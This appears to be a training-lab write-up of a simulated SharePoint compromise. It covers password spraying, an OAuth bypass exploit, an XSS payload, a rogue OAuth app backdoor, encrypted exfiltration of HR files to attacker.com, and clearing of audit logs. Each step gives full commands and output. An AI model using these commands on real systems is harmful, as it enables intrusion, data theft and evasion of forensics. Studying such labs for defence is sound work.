# GraySentinel - Day3 Lab PoC
Jnanashree Anchan | 11 September 2026

Mission: Recon & Password Spray

## KEY CONCEPTS

| Concept | Description |
|---|---|
| CVE-2026-55040 | SharePoint OAuth authentication bypass. |
| Legba | Password spraying tool. |
| Atomic-Operator | Vulnerability testing framework. |
| XSStrike | XSS detection with WAF bypass. |
| OAuth App | Persistent credentials for ongoing access. |
| Stored XSS | Persistent XSS in SharePoint lists. |
| Exfiltration | Copying sensitive data out. |
| Audit Logs | Clearing logs hides activity. |

---

## Phase 1
 Recon & Password Spray

**Command:**
```bash
legba http --target "https://sharepoint.target.com/_api/web/currentuser" --auth-type basic --user-list usernames.txt --pass-list passwords.txt --rate-limit 3 --output spray_results.json
```

**Output:**
```bash
breacher@kali:~$ legba http --target "[https://sharepoint.target.com/_api/web/currentuser](https://sharepoint.target.com/_api/web/currentuser)" --auth-type basic --user-list usernames.txt --pass-list passwords.txt --rate-limit 3 --output spray_results.json
[INFO] Starting spray...
[OK] Found: jsmith@target.com:Summer2024!
[OK] Found: admin@target.com:Admin123
2 successes.
```

Legba is a password spraying tool that tests a small set of commonly used passwords from passwords.txt across large list of usernames from usernames.txt. Executed with 2 results.

---

## Phase 2
 Exploit OAuth Bypass

**Command:**
```bash
atomic-operator --test "CVE-2026-55040" --target "[https://sharepoint.target.com](https://sharepoint.target.com)" --output sharepoint_breach.json
```

**Output:**
```bash
breacher@kali:~$ atomic-operator --test "CVE-2026-55040" --target "[https://sharepoint.target.com](https://sharepoint.target.com)" --output sharepoint_breach.json
[INFO] Starting test...
[+] Token obtained.
[+] Access granted as System Account.
[VULNERABILITY CONFIRMED]
Atomic-Operator test.
```

Atomic operator executes vulnerability test for CVE-2026-55040 on the target sharepoint server where the sharepoint server accepted the token obtained as System account.

---

## Phase 3
 Persistence & XSS

**Command:**
```bash
xsstrike -u "[https://sharepoint.target.com/_api/web/lists/getbytitle('Announcements')/items?$filter=Title](https://sharepoint.target.com/_api/web/lists/getbytitle('Announcements')/items?$filter=Title) eq 'XSS'" --crawl --fuzzer --output xsstrike_results.json
```
**Output:**
```bash
breacher@kali:~$ xsstrike -u "[https://sharepoint.target.com/_api/web/lists/getbytitle('Announcements')/items?$filter=Title](https://sharepoint.target.com/_api/web/lists/getbytitle('Announcements')/items?$filter=Title) eq 'XSS'" --crawl --fuzzer --output xsstrike_results.json
[!]Potential XSS in parameter: $filter
[!]WAF bypass:<svg/onload=alert(1)>
```

Xsstrike finds cross-site scripting vulnerabilities in web applications. Scan found a live XSS vulnerability in the parameter $filter in Announcements and allows attacker to slip the payload <svg/onload=alert(1)>


**Command:**
```bash
curl -X POST "[https://sharepoint.target.com/_api/oauth2/applications](https://sharepoint.target.com/_api/oauth2/applications)" -H "Authorization: Bearer $TOKEN" -d '{"name":"MaintenanceApp","redirectUri":"[https://attacker.com/callback](https://attacker.com/callback)","permissions":"full"}' -H "Content-Type: application/json"
```

**Output:**
```bash
breacher@kali:~$ curl -X POST "[https://sharepoint.target.com/_api/oauth2/applications](https://sharepoint.target.com/_api/oauth2/applications)" -H "Authorization: Bearer $TOKEN" -d '{"name":"MaintenanceApp","redirectUri":"[https://attacker.com/callback](https://attacker.com/callback)","permissions":"full"}' -H "Content-Type: application/json"
{"client_id":"new-client-id","name":"MaintenanceApp"}
```

The attacker uses the stolen admin token to register a malicious app called "MaintenanceApp" with full permissions and an external callback URL, creating a permanent backdoor to access SharePoint anytime.

---

## Phase 4
 Exfiltrate data

**Command:**
```bash
curl -H "Authorization: Bearer $TOKEN" "[https://sharepoint.target.com/_api/web/getfolderbyserverrelativeurl('/sites/HR/Documents')/files](https://sharepoint.target.com/_api/web/getfolderbyserverrelativeurl('/sites/HR/Documents')/files)" | jq '.value[].Name' >> exfiltrated_files.txt
```

**Output:**
```bash
breacher@kali:~$ curl -H "Authorization: Bearer $TOKEN" "https://sharepoint.target.com/_api/web/getfolderbyserverrelativeurl('/sites/HR/Documents')/files" | jq '.value[].Name' >> exfiltrated_files.txt
"Employee_Contracts.docx"
"Salary_Report.xlsx"
```

**Command:**
```bash
tar -czf exfiltrated_data.tar.gz *.docx *.xlsx *.pdf
gpg -c exfiltrated_data.tar.gz
curl -F "file=@exfiltrated_data.tar.gz.gpg" [http://attacker.com/upload](http://attacker.com/upload)
```
**Output:**
```bash
breacher@kali:~$ tar -czf exfiltrated_data.tar.gz *.docx *.xlsx *.pdf
a Employee_Contracts.docx
a Salary_Report.xlsx
breacher@kali:~$ gpg -c exfiltrated_data.tar.gz
Enter passphrase:********
gpg: encrypted file
breacher@kali:~$ curl -F "file=@exfiltrated_data.tar.gz.gpg" [http://attacker.com/upload](http://attacker.com/upload)
{"status":"success"}
```
- Compress all the .docx, .xlsx and .pdf files into ‘exfiltrated_data.tar.gz’ to reduce transfer time.
- Gpg encrypts the archive file with symmetrical cipher to prompt for a passphrase creating an encrypted file ‘exfiltrated_data.tar.gz.gpg’ . 
- Transmits the encrypted archive ‘exfiltrated_data.tar.gz.gpg’ to an attacker controlled we server ‘http://attacker.com/upload


---

## Phase 5
 Cover and detection

**Command:**
```bash
curl -X POST "[https://sharepoint.target.com/_api/sitecollection/auditlog/clear](https://sharepoint.target.com/_api/sitecollection/auditlog/clear)" -H "Authorization: Bearer $TOKEN"
```
**Output:**
```bash
breacher@kali:~$ curl -X POST "[https://sharepoint.target.com/_api/sitecollection/auditlog/clear](https://sharepoint.target.com/_api/sitecollection/auditlog/clear)" -H "Authorization: Bearer $TOKEN"
{"status":"success"}
```

The attacker uses the administrative token to call SharePoint's audit log purge API, wiping historical activity logs to cover their tracks and hinder forensic investigation.
---


## Summary

| Phase | Action Taken | Tool | Attacker Goal |
|---|---|---|---|
| 1. Recon / Initial Access | Password Spraying | legba | Probe for weak credentials across all users at a low, quiet rate. |
| 2. Exploitation | Auth Bypass (CVE-2026-55040) | atomic-operator | Forge an admin JWT to bypass login and gain full system control. |
| 3. Persistence | Stored XSS & OAuth Backdoor | xsstrike, curl API register | Maintain persistent access via malicious scripts and a rogue app registration. |
| 4. Collection & Exfiltration | Discovery, Archiving, Encryption, Transfer | curl, tar, gpg | Locate HR documents, encrypt them to evade DLP/firewalls, and push them to an external server. |
| 5. Defense Evasion | Audit Log Purge | curl (API clear) | Wipe evidence of activity to delay detection and complicate forensics. |

Simulated an end-to-end compromise across the entire cyber attack lifecycle (MITRE ATT&CK framework), showing how separate, low-level weaknesses chain together into a full breach.
